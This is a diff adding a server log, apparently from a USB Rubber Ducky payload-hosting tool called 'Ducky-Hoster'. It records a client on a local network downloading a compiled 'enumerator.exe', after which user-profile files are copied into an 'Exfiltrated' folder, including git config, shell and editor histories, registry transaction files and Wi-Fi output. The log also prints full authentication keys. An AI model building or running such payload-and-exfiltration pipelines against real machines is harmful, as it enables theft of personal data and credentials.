@@ -1,0 +1,47 @@
+2024-7-30 1:32:43 -	✅ Server launched on port 443.
+2024-7-30 1:32:43 -	✅ HTTP Redirect Server launched on port 80.
+2024-7-30 1:32:43 -	✅ Retrieved all keys in ./Keys/
+2024-7-30 1:32:43 -	✅ getKeys and postKeys directory loaded
+2024-7-30 1:40:8 -	✅ Server launched on port 443.
+2024-7-30 1:40:8 -	✅ HTTP Redirect Server launched on port 80.
+2024-7-30 1:40:8 -	✅ Retrieved all keys in ./Keys/
+2024-7-30 1:40:8 -	✅ getKeys and postKeys directory loaded
+2024-7-30 1:40:36 -	
+2024-7-30 1:40:36 -	Connection established with ::ffff:192.168.0.134 via port 50063.
+2024-7-30 1:40:36 -	Request Type: GET
+2024-7-30 1:40:36 -	Request Host: 192.168.0.156
+2024-7-30 1:40:36 -	Auth Key: tmMEQW=S0_O}<0F_1]iadHUH5MyBZqfVcRW3`vEG8v?5t[p81QQ4qh^YSix{P0`DuTvg81`D[YEaSjYOgQJu<~LRAAsF3>~@Bg~seca{OuUTBq?<^zevI}C@lTz[8UNa:C7?>]Vfd1mXs7nvV]C^v;M|^:dZ&aA3`x9jK6IQI<f2ecFcP=i?wzhKB0XQ>9Wg`V<8wINFj{LLs=1qrbDV82<t8NeX8{Lr]j}4s4zx;Jp^aP13uprR;Q49;1wIx<s[{Y&Imq9Az9p;}T5@NdSVY7Az]8`XDMon]IT==vC[FXv@at]&bz=pW=l<AS8Q4Oe6o44:OrOBiW:aAhK{4StA:_SQlOfU1^4UHmNc_<hihr&j@]]O5@23`usV&Ew^aJvtidXP<1BIY8Rn4CCblsqdHnZ;BarIC5LQ5AASL4T<O9f3dDRF]cwl`JbjOLIZ}R;`tYd9X6w|3}a99>iSQt<IcUy^k4yMHBWA__6e:3ouRp7O5Y4;U;CipxYJ}Zzje56[
+2024-7-30 1:40:37 -	C file C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Executables\EnumeratorRecursive\enumerator.exe from ::ffff:192.168.0.134 compiled!
+2024-7-30 1:40:37 -	🔨 EXE file C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Executables\EnumeratorRecursive\enumerator.exe sent to ::ffff:192.168.0.134.
+2024-7-30 1:43:57 -	✅ Server launched on port 443.
+2024-7-30 1:43:57 -	✅ HTTP Redirect Server launched on port 80.
+2024-7-30 1:43:57 -	✅ Retrieved all keys in ./Keys/
+2024-7-30 1:43:57 -	✅ getKeys and postKeys directory loaded
+2024-7-30 1:44:52 -	
+2024-7-30 1:44:52 -	Connection established with ::ffff:192.168.0.134 via port 50123.
+2024-7-30 1:44:52 -	Request Type: GET
+2024-7-30 1:44:52 -	Request Host: 192.168.0.156
+2024-7-30 1:44:52 -	Auth Key: tmMEQW=S0_O}<0F_1]iadHUH5MyBZqfVcRW3`vEG8v?5t[p81QQ4qh^YSix{P0`DuTvg81`D[YEaSjYOgQJu<~LRAAsF3>~@Bg~seca{OuUTBq?<^zevI}C@lTz[8UNa:C7?>]Vfd1mXs7nvV]C^v;M|^:dZ&aA3`x9jK6IQI<f2ecFcP=i?wzhKB0XQ>9Wg`V<8wINFj{LLs=1qrbDV82<t8NeX8{Lr]j}4s4zx;Jp^aP13uprR;Q49;1wIx<s[{Y&Imq9Az9p;}T5@NdSVY7Az]8`XDMon]IT==vC[FXv@at]&bz=pW=l<AS8Q4Oe6o44:OrOBiW:aAhK{4StA:_SQlOfU1^4UHmNc_<hihr&j@]]O5@23`usV&Ew^aJvtidXP<1BIY8Rn4CCblsqdHnZ;BarIC5LQ5AASL4T<O9f3dDRF]cwl`JbjOLIZ}R;`tYd9X6w|3}a99>iSQt<IcUy^k4yMHBWA__6e:3ouRp7O5Y4;U;CipxYJ}Zzje56[
+2024-7-30 1:44:52 -	C file C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Executables\EnumeratorRecursive\enumerator.exe from ::ffff:192.168.0.134 compiled!
+2024-7-30 1:44:52 -	🔨 EXE file C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Executables\EnumeratorRecursive\enumerator.exe sent to ::ffff:192.168.0.134.
+2024-7-30 1:44:54 -	
+2024-7-30 1:44:54 -	Connection established with ::ffff:192.168.0.134 via port 50124.
+2024-7-30 1:44:54 -	Request Type: POST
+2024-7-30 1:44:54 -	Request Host: 192.168.0.156
+2024-7-30 1:44:54 -	Auth Key: y7russVND&Tv&GL=wCjXP5xCRmkHBMl7MNZIhnsJ6UL1=Vi2RJ|Krc^?nF_TqWn7:CRATy{yzUzDIJMS4IL:S5;EgT3}?t|HHdbaX&lbP=`rpbbt4ddWSjxfEpf^P64W4NsA<MMF1vd]YS_uA@2}1aj8=l4i2`OaPX8<_BDtIFGP>67uwY|BL3BdJoQa8@k}s1&@^:R~`nrZzhkB|Od0&=jy?m>e_=7xWnTBW<ou__WoY9H2:Bp7L`{0@hSpH;b5vAJYpr=A53IF[GlCccDA<TxzHmojcm5nuzXr2|UZV];FTFu5C^Ux|bm}~JWZ~Bol|SgWqbn33ui]JXTYgqnE;:Z>hkLOOfkLsee>I&>raGCeot&@hR^taWp@aB8BPtxtUJh2=g{[vfNCxeaszTJ{z=?^?LlbTw[9tAC;mM?po&|<S{BRzA{RMMiWiQ|G2XF~[[g3_^9zm{[ub=9=8WJocAx32}yy^8h_`r~_1sjqP[ljM@tO>zlxevmU`wA>5C`x
+2024-7-30 1:44:54 -	Executing enumerator POST function
+2024-7-30 1:44:54 -	Copied file .gitconfig into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\.gitconfig.
+2024-7-30 1:44:54 -	Copied file .lesshst into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\.lesshst.
+2024-7-30 1:44:54 -	Copied file .node_repl_history into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\.node_repl_history.
+2024-7-30 1:44:54 -	Copied file .viminfo into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\.viminfo.
+2024-7-30 1:44:54 -	Copied file DeviceInfo.json into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\DeviceInfo.json.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.0.regtrans-ms into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.0.regtrans-ms.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.1.regtrans-ms into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.1.regtrans-ms.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.2.regtrans-ms into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.2.regtrans-ms.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.blf into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f17-cdbf-11ec-8680-002248483d79}.TxR.blf.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms.
+2024-7-30 1:44:54 -	Copied file NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms.
+2024-7-30 1:44:54 -	Copied file ntuser.ini into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\ntuser.ini.
+2024-7-30 1:44:54 -	Copied file wifi_out.exe into C:\Users\Justi\Desktop\Code\Ducky-Hoster\Server\Exfiltrated\2024-7-30 1-43-57 enumerator\wifi_out.exe.
+2024-7-30 1:44:54 -	🔨 POST Function finished executing.
